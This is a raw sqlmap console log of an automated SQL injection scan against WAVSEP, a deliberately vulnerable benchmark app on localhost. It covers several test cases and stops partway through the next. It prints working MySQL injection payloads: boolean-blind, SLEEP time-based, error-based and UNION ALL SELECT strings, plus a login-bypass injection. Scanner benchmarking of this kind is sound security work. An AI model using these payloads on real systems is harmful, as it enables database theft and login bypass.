[04:47:36] [INFO] testing if GET parameter 'msgId' is dynamic
[04:47:36] [INFO] GET parameter 'msgId' appears to be dynamic
[04:47:36] [INFO] heuristic (basic) test shows that GET parameter 'msgId' might be injectable
[04:47:36] [INFO] testing for SQL injection on GET parameter 'msgId'
[04:47:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:47:36] [INFO] GET parameter 'msgId' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="web")
[04:47:36] [INFO] testing 'Generic inline queries'
[04:47:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:47:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:47:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:47:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:47:36] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:47:36] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:47:36] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:47:36] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:47:36] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:36] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:47:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:47:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:47:36] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:47:36] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:36] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:47:36] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:47:37] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:47:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:47:37] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:47:37] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:47:37] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:47:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:47:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:47:37] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:47:37] [INFO] testing 'MySQL inline queries'
[04:47:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:47:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:47:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:47:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:47:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:47:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:47:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:47:47] [INFO] GET parameter 'msgId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:47:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:47:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:47:47] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:47:47] [INFO] target URL appears to have 3 columns in query
[04:47:47] [INFO] GET parameter 'msgId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'msgId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
---
Parameter: msgId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: msgId=1 AND 3905=3905

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgId=1 AND (SELECT 4552 FROM (SELECT(SLEEP(5)))okNb)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: msgId=1 UNION ALL SELECT NULL,CONCAT(0x7170716271,0x51674172746c6678746949715a7345504959517477534b586a63586c4c6a4b47506d647a57554263,0x716a786271),NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:47:47] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[18/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=10000
do you want to test this URL? [Y/n/q]
> Y
[04:47:47] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp?minBalanace=10000'                                                                               
[04:47:47] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=3C7D0B782EA...2F2E12A39B'). Do you want to use those [Y/n] Y
[04:47:47] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:47:47] [INFO] testing if the target URL content is stable
[04:47:48] [INFO] target URL content is stable
[04:47:48] [INFO] testing if GET parameter 'minBalanace' is dynamic
[04:47:48] [WARNING] GET parameter 'minBalanace' does not appear to be dynamic
[04:47:48] [WARNING] heuristic (basic) test shows that GET parameter 'minBalanace' might not be injectable
[04:47:48] [INFO] testing for SQL injection on GET parameter 'minBalanace'
[04:47:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:47:48] [INFO] GET parameter 'minBalanace' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[04:47:48] [INFO] testing 'Generic inline queries'
[04:47:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:47:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:47:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:47:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:47:48] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:47:48] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:47:48] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:47:49] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:47:49] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:49] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:47:49] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:47:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:47:49] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:47:49] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:47:49] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:47:49] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:47:49] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:47:49] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:47:49] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:47:49] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:47:49] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:47:49] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:47:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:47:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:47:49] [INFO] testing 'MySQL inline queries'
[04:47:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:47:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:47:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:47:49] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:47:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:47:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:47:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:47:59] [INFO] GET parameter 'minBalanace' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:47:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:47:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:47:59] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:47:59] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[04:47:59] [INFO] target URL appears to be UNION injectable with 1 columns
[04:47:59] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:47:59] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:48:00] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:48:00] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:48:00] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:48:00] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:48:00] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:48:00] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:48:00] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:48:00] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:48:00] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:48:00] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:48:01] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:48:01] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:48:01] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:48:01] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:48:01] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:48:01] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:48:01] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:48:01] [INFO] checking if the injection point on GET parameter 'minBalanace' is a false positive
GET parameter 'minBalanace' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 501 HTTP(s) requests:
---
Parameter: minBalanace (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: minBalanace=10000 AND 5266=5266

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: minBalanace=10000 AND (SELECT 6967 FROM (SELECT(SLEEP(5)))pZKp)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:48:01] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[19/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp?msgid=1
do you want to test this URL? [Y/n/q]
> Y
[04:48:01] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp?msgid=1'                                                                                     
[04:48:01] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=7C92EF2CA81...97239DB205'). Do you want to use those [Y/n] Y
[04:48:01] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:48:01] [INFO] testing if the target URL content is stable
[04:48:02] [INFO] target URL content is stable
[04:48:02] [INFO] testing if GET parameter 'msgid' is dynamic
[04:48:02] [WARNING] GET parameter 'msgid' does not appear to be dynamic
[04:48:02] [WARNING] heuristic (basic) test shows that GET parameter 'msgid' might not be injectable
[04:48:02] [INFO] testing for SQL injection on GET parameter 'msgid'
[04:48:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:48:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:48:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:48:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:48:03] [INFO] GET parameter 'msgid' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[04:48:03] [INFO] testing 'Generic inline queries'
[04:48:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:48:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:48:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:48:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:48:03] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:48:03] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:48:03] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:48:03] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:48:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:48:03] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:48:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:48:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:48:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:48:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:48:03] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:48:03] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:48:03] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:48:03] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:48:03] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:48:03] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:48:03] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:48:03] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:48:03] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:48:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:48:03] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:48:03] [INFO] testing 'MySQL inline queries'
[04:48:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:48:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:48:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:48:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:48:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:48:03] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:48:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:48:13] [INFO] GET parameter 'msgid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:48:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:48:13] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:48:13] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:48:14] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:48:14] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:48:14] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:48:15] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:48:15] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:48:15] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:48:15] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:48:15] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:48:16] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:48:16] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:48:16] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:48:16] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:48:16] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:48:16] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:48:16] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:48:17] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:48:17] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:48:17] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:48:17] [INFO] checking if the injection point on GET parameter 'msgid' is a false positive
GET parameter 'msgid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 763 HTTP(s) requests:
---
Parameter: msgid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: msgid=1 AND 7606=(SELECT (CASE WHEN (7606=7606) THEN 7606 ELSE (SELECT 5442 UNION SELECT 2535) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgid=1 AND (SELECT 4202 FROM (SELECT(SLEEP(5)))cbtW)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:48:17] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[20/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp?username=textvalue&password=textvalue2
do you want to test this URL? [Y/n/q]
> Y
[04:48:17] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case01-InjectionInLogin-String-LoginBypass-With200Errors.jsp?username=textvalue&password=textvalue2'                                                                                      
[04:48:17] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=E7461FA8939...1CA9B862B3'). Do you want to use those [Y/n] Y
[04:48:17] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:48:17] [INFO] testing if the target URL content is stable
[04:48:18] [INFO] target URL content is stable
[04:48:18] [INFO] testing if GET parameter 'username' is dynamic
[04:48:18] [WARNING] GET parameter 'username' does not appear to be dynamic
[04:48:18] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable (possible DBMS: 'MySQL')
[04:48:18] [INFO] heuristic (XSS) test shows that GET parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[04:48:18] [INFO] testing for SQL injection on GET parameter 'username'
[04:48:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:48:18] [WARNING] reflective value(s) found and filtering out
[04:48:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:48:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:48:19] [INFO] GET parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="login failed")
[04:48:19] [INFO] testing 'Generic inline queries'
[04:48:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:48:19] [INFO] GET parameter 'username' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:48:19] [INFO] testing 'MySQL inline queries'
[04:48:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:48:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:48:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:48:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:48:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:48:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:48:19] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:48:29] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:48:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:48:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:48:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:48:29] [INFO] target URL appears to have 2 columns in query
[04:48:29] [INFO] GET parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[04:48:29] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 215 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=textvalue' OR NOT 2082=2082-- JOzE&password=textvalue2

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: username=textvalue' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178627671,(SELECT (ELT(2052=2052,1))),0x7171716a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- DKFG&password=textvalue2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=textvalue' AND (SELECT 6660 FROM (SELECT(SLEEP(5)))tOFI)-- uaxg&password=textvalue2

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=textvalue' UNION ALL SELECT CONCAT(0x7178627671,0x584f6d624a72464c75747a6a6b5275575a6668786f79567a4563685575684b54494765686e484152,0x7171716a71),NULL-- -&password=textvalue2
---
do you want to exploit this SQL injection? [Y/n] Y
[04:48:29] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[21/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp?msg=textvalue
do you want to test this URL? [Y/n/q]
> Y
[04:48:29] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case02-InjectionInSearch-String-UnionExploit-With200Errors.jsp?msg=textvalue'                                                                                                             
[04:48:29] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=E6FDAD3D006...720445DEE9'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: msg (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: msg=textvalue' OR NOT 1045=1045#

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msg=textvalue' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627a71,(SELECT (ELT(4973=4973,1))),0x7162787a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- JNft

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=textvalue' AND (SELECT 2239 FROM (SELECT(SLEEP(5)))JrkC)-- sIhL

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: msg=textvalue' UNION ALL SELECT NULL,CONCAT(0x716a627a71,0x4e4f4b656f4a7a714d61546a6d6f6f70746a62524f51654458715650616d52454645487452706579,0x7162787a71),NULL#
---
do you want to exploit this SQL injection? [Y/n] Y
[04:48:29] [INFO] testing MySQL
[04:48:29] [INFO] confirming MySQL
[04:48:29] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.0
[22/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp?username=textvalue
do you want to test this URL? [Y/n/q]
> Y
[04:48:29] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case03-InjectionInCalc-String-BooleanExploit-With200Errors.jsp?username=textvalue'                                                                                                        
[04:48:29] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=03A2564D1A5...791A2B4F1F'). Do you want to use those [Y/n] Y
[04:48:29] [INFO] testing if GET parameter 'username' is dynamic
[04:48:29] [WARNING] GET parameter 'username' does not appear to be dynamic
[04:48:29] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable (possible DBMS: 'MySQL')
[04:48:29] [INFO] heuristic (XSS) test shows that GET parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[04:48:29] [INFO] testing for SQL injection on GET parameter 'username'
[04:48:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:48:29] [WARNING] reflective value(s) found and filtering out
[04:48:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:48:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:48:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:48:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:48:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:48:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:48:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
